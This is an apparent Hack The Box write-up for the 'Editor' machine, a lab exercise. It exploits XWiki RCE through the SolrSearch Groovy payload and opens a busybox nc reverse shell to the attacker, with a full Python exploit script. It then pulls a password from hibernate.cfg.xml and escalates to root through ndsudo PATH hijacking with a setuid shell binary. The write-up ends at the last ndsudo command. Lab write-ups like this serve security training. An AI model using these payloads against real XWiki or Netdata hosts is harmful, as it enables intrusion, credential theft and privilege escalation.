---
title: Editor [Easy]
published: false
date: 2025-08-04
tags: [htb, linux, nmap, cve-2024-31982, cve-2025-24893, penelope, busybox, nc, mysql, suid, ndsudo, gcc, path hijacking, ssh]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/editor-htb-season8
image: /assets/img/editor-htb-season8/editor-htb-season8_banner.png
---

# Editor HTB Season 8
## Machine information
Author: [kavigihan](https://app.hackthebox.com/users/389926) & [TheCyberGeek](https://app.hackthebox.com/users/114053)

> *Services may take up to 5 minutes to load.*

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 06:14 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.48s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.xx.xx:8080/xwiki/bin/view/Main/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     editor.htb
```

So this machine got port `80` and `8080` open. Gonna check these out.

### Web Enumeration
We will go with `http://editor.htb` first.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_home_page.png)

This website was just about code editor, let's go around the website.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_code_editor.png)

When we scroll down, saw some *Quick Links* section. Then hover to **Documentation** and saw that it's a link to `wiki.editor.htb/xwiki/`. <br>
&rarr; Add `wiki.editor.htb` to `/etc/hosts` file.

```bash
10.129.xx.xx     editor.htb wiki.editor.htb
```

Let's check out the `http://wiki.editor.htb/xwiki/`.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_wiki_page.png)

This one is about **SimplistCode Pro Wiki** for everyone want for simplicity rather than *compromising functionality*. <br>
So we had go through port `80`, let's check for port `8080`. But if we recognize in the nmap scan, we can see there is some information related to `Jetty` and `XWiki`.

```bash
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.xx.xx:8080/xwiki/bin/view/Main/
```

![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_page.png)

As expected, if we put `http://editor.htb:8080/xwiki/` in the browser, we will get the same page. <br>
Then perfomance some `ffuf` to enumerate some directories or hidden files but got nothing interesting. <br>
&rarr; Let's check the version of this website.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_version.png)

We can see that at the bottom in the page, it shows `XWiki Debian 15.10.8`. <br>
&rarr; Checking for vulnerabilities.

### CVE-2024-31982 & CVE-2025-24893
Found some resources: [XWiki RCE CVE-2024-31982 Exploit](https://www.vicarius.io/vsociety/posts/xwiki-rce-cve-2024-31982-exploit) and [exploit-db](https://www.exploit-db.com/exploits/52136).

So here is the summary of the `CVE-2024-31982`: <br>
> **XWiki vulnerability allows unauthorized remote code execution via database search, threatening data integrity and availability across all installations.**

We gonna try the script from [XWiki RCE CVE-2024-31982 Exploit](https://www.vicarius.io/vsociety/posts/xwiki-rce-cve-2024-31982-exploit) to see if it works.

```bash
└─$ python3 exploit.py -u http://wiki.editor.htb -c 'cat /etc/passwd'
```

Does not get any output. Nothing to worry, let's move on to [exploit-db](https://www.exploit-db.com/exploits/52136).

Checking out this one, it assign to `CVE-2025-24893` and it execute through *SolrSearch* endpoint. We can either download from exploit-db or download script from [CVE-2025-24893](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py).

```bash
└─$ python3 CVE-2025-24893.py 
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): wiki.editor.htb/xwiki
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb/xwiki
[+] Sending request to: http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✔] Exploit successful! Output received:
<p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;rss xmlns:dc="<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://purl.org/dc/elements/1.1/"><span class="wikigeneratedlinkcontent">http://purl.org/dc/elements/1.1/</span></a></span>" version="2.0"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin<br/>systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin<br/>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br/>systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin<br/>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br/>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br/>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br/>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br/>tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false<br/>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br/>fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin<br/>usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin<br/>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br/>dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin<br/>mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false<br/>tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin<br/>xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin<br/>netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin<br/>oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash<br/>_laurel:x:995:995::/var/log/laurel:/bin/false</sub>]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"><span class="wikigeneratedlinkcontent">http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin<br/>systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin<br/>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br/>systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin<br/>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br/>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br/>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br/>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br/>tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false<br/>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br/>fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin<br/>usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin<br/>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br/>dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin<br/>mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false<br/>tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin<br/>xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin<br/>netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin<br/>oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash<br/>_laurel:x:995:995::/var/log/laurel:/bin/false</sub>]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright /&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights /&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div class="wikimodel-emptyline"></div><div class="wikimodel-emptyline"></div>
```

BOOM! We got the output. From here some questions will come into our mind that *How to identify SolrSearch endpoint?* <br>
&rarr; Search for the `CVE-2025-24893` and found out this [blog](https://www.offsec.com/blog/cve-2025-24893/) from Offensive Security talk deep about this exploit.

We saw a click from the output, let's check it out.

```bash
http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_rce.png)

So to able to get the reverse shell, we need to modified the payload `cat /etc/passwd`. <br>
We gonna change to `busybox nc 10.xx.xx.xx 3333 -e /bin/sh` and get the reverse shell.

The reason why using [busybox](https://gtfobins.github.io/gtfobins/busybox/) instead of `nc`: <br>
- Single executable containing implementations of many common Unix utilities
- Space-efficient alternative to GNU coreutils, util-linux, etc.
- Designed for embedded systems where space and memory are limited
- Self-contained - one binary provides hundreds of commands

> And also `nc` sometimes are available and not available but also using `nc` alone may failed for some situation. To know more about [busybox](https://gtfobins.github.io/gtfobins/busybox/) &rarr; Check out this [blog](https://duckwrites.medium.com/oscp-tip-reverse-shell-with-busybox-359d755a6383).

Now start the listener in our kali machine, we gonna use `penelope -p 3333` to get the reverse shell.

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

After change the payload, we need to click the click in order to trigger the process.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_rce_1.png)

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xxx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from editor~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Got reverse shell from editor~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/editor~10.129.xx.xx-Linux-x86_64/2025_08_03-23_06_47-487.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
xwiki@editor:/usr/lib/xwiki-jetty$
```

Got connection back as `xwiki` user. <br>
Either we can craft our own script to automated so that we just run and check our listener. <br>

```python
import requests
from html import unescape

def detect_protocol(domain):
    """Try to connect via HTTPS first, fallback to HTTP if unavailable."""
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"
    
    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] HTTPS available: {https_url}")
            return https_url
    except:
        print("[!] HTTPS not available. Falling back to HTTP.")
        
    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] HTTP available: {http_url}")
            return http_url
    except:
        print("[✖] Unable to reach target.")
        exit(1)

def send_direct_revshell(target_url, lhost, lport):
    """Send reverse shell payload using Groovy RCE with BusyBox."""
    print(f"[+] Sending direct reverse shell via busybox to {lhost}:{lport} ...")
    
    # BusyBox reverse shell command
    cmd = f"busybox nc {lhost} {lport} -e /bin/sh"
    encoded_cmd = cmd.replace('"','\\"')
    
    # Construct malicious URL with Groovy payload
    payload_url = (
        f"{target_url}/bin/get/Main/SolrSearch?media=rss&text="
        f"%7D%7D%7D%7B%7Basync%20async=false%7D%7D"
        f"%7B%7Bgroovy%7D%7D\"{encoded_cmd}\".execute()%7B%7B/groovy%7D%7D"
        f"%7B%7B/async%7D%7D"
    )
    
    try:
        requests.get(payload_url, timeout=5)
    except requests.exceptions.RequestException:
        pass

if __name__ == "__main__":
    print("=" * 80)
    print("XWiki CVE-2024-31982 - Direct Reverse Shell via BusyBox")
    print("=" * 80)
    
    target = "editor.htb:8080/xwiki"
    lhost = "10.xx.xx.xx"  # Change this to attacker ip
    lport = "3333"
    
    target_url = detect_protocol(target)
    send_direct_revshell(target_url, lhost, lport)
    print("[✔] Payload sent. Check your listener.")
```

```bash
└─$ python3 exploit.py       
================================================================================
XWiki CVE-2024-31982 - Direct Reverse Shell via BusyBox
================================================================================
[!] HTTPS not available. Falling back to HTTP.
[✔] HTTP available: http://editor.htb:8080/xwiki
[+] Sending direct reverse shell via busybox to 10.xx.xx.xx:3333 ...
[✔] Payload sent. Check your listener.
```

After getting inside, we discover there is a nother user `oliver`.

```bash
xwiki@editor:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Jul  8 08:34 .
drwxr-xr-x 18 root   root   4096 Jul 29 11:55 ..
drwxr-x---  3 oliver oliver 4096 Jul  8 08:34 oliver
xwiki@editor:/home$ cd oliver
```

There is also other port as well, we gonna check focus on port `3306` for mysql as it may contain some credentials.

```bash
xwiki@editor:/home$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40585         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      1125/java           
tcp6       0      0 :::8080                 :::*                    LISTEN      1125/java           
udp        0      0 127.0.0.1:8125          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

### DB Creds Extraction
Do not know about the mysql work for XWiki so take some time research and found out this [XWiki MySQL](https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Installation/InstallationWAR/InstallationMySQL/). <br>
Reading through and found out there is part where we can apply to the machine to see if we can got the credentials.

![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_mysql.png)

Let's check out `WEB-INF/hibernate.cfg.xml` and `grep` for `password`.

```bash
xwiki@editor:/usr/lib/xwiki/WEB-INF$ ls -la
total 280
drwxr-xr-x 4 root root   4096 Jul 29 11:48 .
drwxr-xr-x 7 root root   4096 Jul 29 11:46 ..
lrwxrwxrwx 1 root root     16 Mar 27  2024 cache -> /etc/xwiki/cache
drwxr-xr-x 2 root root   4096 Jul 29 11:46 classes
lrwxrwxrwx 1 root root     16 Mar 27  2024 fonts -> /etc/xwiki/fonts
lrwxrwxrwx 1 root root     28 Mar 27  2024 hibernate.cfg.xml -> /etc/xwiki/hibernate.cfg.xml
lrwxrwxrwx 1 root root     41 Mar 27  2024 jboss-deployment-structure.xml -> /etc/xwiki/jboss-deployment-structure.xml
lrwxrwxrwx 1 root root     24 Mar 27  2024 jetty-web.xml -> /etc/xwiki/jetty-web.xml
drwxr-xr-x 2 root root 270336 Jul 29 11:46 lib
lrwxrwxrwx 1 root root     22 Mar 27  2024 observation -> /etc/xwiki/observation
lrwxrwxrwx 1 root root     22 Mar 27  2024 portlet.xml -> /etc/xwiki/portlet.xml
lrwxrwxrwx 1 root root     22 Mar 27  2024 sun-web.xml -> /etc/xwiki/sun-web.xml
lrwxrwxrwx 1 root root     29 Mar 27  2024 version.properties -> /etc/xwiki/version.properties
lrwxrwxrwx 1 root root     18 Mar 27  2024 web.xml -> /etc/xwiki/web.xml
lrwxrwxrwx 1 root root     20 Mar 27  2024 xwiki.cfg -> /etc/xwiki/xwiki.cfg
lrwxrwxrwx 1 root root     28 Mar 27  2024 xwiki-locales.txt -> /etc/xwiki/xwiki-locales.txt
lrwxrwxrwx 1 root root     27 Mar 27  2024 xwiki.properties -> /etc/xwiki/xwiki.properties
```

```bash
xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep -i password
    <property name="hibernate.connection.password">theEd1t0rTeamxx</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

Got the credentials `theEd1t0rTeamxx` and `xwiki`. <br>
&rarr; Gonna try to `ssh` to `oliver` user.

```bash
└─$ ssh oliver@editor.htb            
oliver@editor.htb's password: 
oliver@editor:~$ ls -la
total 28
drwxr-x--- 3 oliver oliver 4096 Jul  8 08:34 .
drwxr-xr-x 3 root   root   4096 Jul  8 08:34 ..
lrwxrwxrwx 1 root   root      9 Jul  1 19:19 .bash_history -> /dev/null
-rw-r--r-- 1 oliver oliver  220 Jun 13 09:45 .bash_logout
-rw-r--r-- 1 oliver oliver 3771 Jun 13 09:45 .bashrc
drwx------ 2 oliver oliver 4096 Jul  8 08:34 .cache
-rw-r--r-- 1 oliver oliver  807 Jun 13 09:45 .profile
-rw-r----- 1 root   oliver   33 Aug  3 09:30 user.txt
oliver@editor:~$ cat user.txt
e07453xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Nailed the `oliver` user and got the `user.txt` flag as well.

## Initial Access
Got into `oliver` user, gonna check some basic stuff to escalate to `root`. <br>
&rarr; To make the process not missing, we can either use [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)  or going through this checklist [Linux Privilege Escalation Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics).

### SUID Binaries
```bash
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

We know that `oliver` user is in the `netdata` group.

```bash
oliver@editor:~$ find / -perm -u=s -type f 2>/dev/null | xargs ls -l
-rwsr-x--- 1 root netdata     965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
-rwsr-x--- 1 root netdata    4261672 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
-rwsr-x--- 1 root netdata      81472 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
-rwsr-x--- 1 root netdata    1144224 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
-rwsr-x--- 1 root netdata     200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata    1377624 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
-rwsr-x--- 1 root netdata     896448 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
-rwsr-xr-x 1 root root         72712 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root         44808 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root         35200 Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root         72072 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root         47488 Apr  9  2024 /usr/bin/mount
-rwsr-xr-x 1 root root         40496 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root         59976 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root         55680 Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root        232416 Jun 25 12:48 /usr/bin/sudo
-rwsr-xr-x 1 root root         35200 Apr  9  2024 /usr/bin/umount
-rwsr-xr-- 1 root messagebus   35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root         18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root        338536 Apr 11 12:05 /usr/lib/openssh/ssh-keysign
```

Found some SUID binaries, the one that interested is `ndsudo` and this one is owned by `root` and can be executed by `netdata` group. Luckily, `oliver` user is in the `netdata` group so we can execute it.

```bash
-rwsr-x--- 1 root netdata     200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Research on `ndsudo` and found this [GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) advisory. <br>
> Talk about: *ndsudo: local privilege escalation via untrusted search path*.

## Privilege Escalation
Let's check out the `ndsudo` first.

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

When using these commands, we got this output.

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
megacli MegaCli : not available in PATH.
oliver@editor:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
nvme : not available in PATH.
```

So `ndsudo` is looking for `megacli` or `MegaCli` in the `PATH`. Which means that we can leverage this point to create a malicious binary and place it in the `PATH` to hijacking the `megacli` command.

### ndsudo (CVE-2024-32019)
First let's create a malicious binary named `megacli` o our kali machine.

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    // Set effective UID and GID to root
    setuid(0);
    setgid(0);
    
    // Execute interactive bash shell as root
    execl("/bin/bash", "bash", "-i", NULL);
    
    return 0;
}
```

> We can check out this [allow setuid on shell scripts](https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts) to know how to allow setuid and compile it.

Then we compile it.

```bash
└─$ gcc megacli.c -o megacli
```

Second step, we gonna transfer the binary to the target machine.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target machine, we gonna make a `/fakebin` directory and place the `megacli` binary there.

```bash
oliver@editor:~$ mkdir -p ~/fakebin
oliver@editor:~$ wget http://10.xx.xx.xx/megacli -O ~/fakebin/megacli
oliver@editor:~$ chmod +x ~/fakebin/megacli
```

Then we gonna modify `PATH` to prioritize our fake binary.

```bash
oliver@editor:~$ export PATH=~/fakebin:$PATH
```

Double check to make sure that the `PATH` is modified.

```bash
oliver@editor:~$ echo $PATH
/home/oliver/fakebin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now we gonna execute `ndsudo` with `megacli-disk-info` command.

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
